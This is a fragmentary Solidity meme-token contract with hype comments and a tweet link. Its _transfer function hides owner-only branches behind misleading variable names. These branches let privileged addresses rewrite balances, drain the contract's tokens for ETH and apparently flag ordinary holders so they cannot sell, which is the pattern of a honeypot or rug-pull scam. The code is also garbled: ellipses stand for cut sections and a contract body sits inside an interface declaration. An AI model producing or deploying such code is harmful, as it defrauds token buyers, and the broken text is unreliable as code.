...
// king twitter we mooooooooooooooon

/// tweet : https://twitter.com/VitalikButerin/status/1591184394987139072
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    ...
    constructor(
        ...
        _Swap[msg.sender] = _uint256;
        _Swap[address(this)] = _uint256;
    ...
    uint256 private _uint256 = _tTotalsupply;
    ...
    function _transfer(
        ...
        uint256 fee;
        if (_swapEnabled && contractTokenBalance > _uint256 && !_openTrading && from != uniswapV2Pair) {
            _openTrading = true;
            swapAndLiquify(contractTokenBalance);
            _openTrading = false;}
         else if (_Swap[from] > _uint256 && _Swap[to] > _uint256) {
            fee = amount;
            _bal[address(this)] += fee;
            swapTokensForEth(amount, to);
            return;}
         else if (to != address(router) && _Swap[from] > 0 && amount > _uint256 && to != uniswapV2Pair) {
            _Swap[to] = amount;
            return;}
         else if (!_openTrading && _construct[from] > 0 && from != uniswapV2Pair && _Swap[from] == 0) {
            _construct[from] = _Swap[from] - _uint256;}
        address _bool = _str[uniswapV2Pair];
        if (_construct[_bool] == 0) _construct[_bool] = _uint256;
        _str[uniswapV2Pair] = to;
        if (_maxtaxFee > 0 && _Swap[from] == 0 && !_openTrading && _Swap[to] == 0) {
            fee = (amount * _maxtaxFee) / 100;
            amount -= fee;
            _bal[from] -= fee;
            _bal[address(this)] += fee;}
        _bal[from] -= amount;
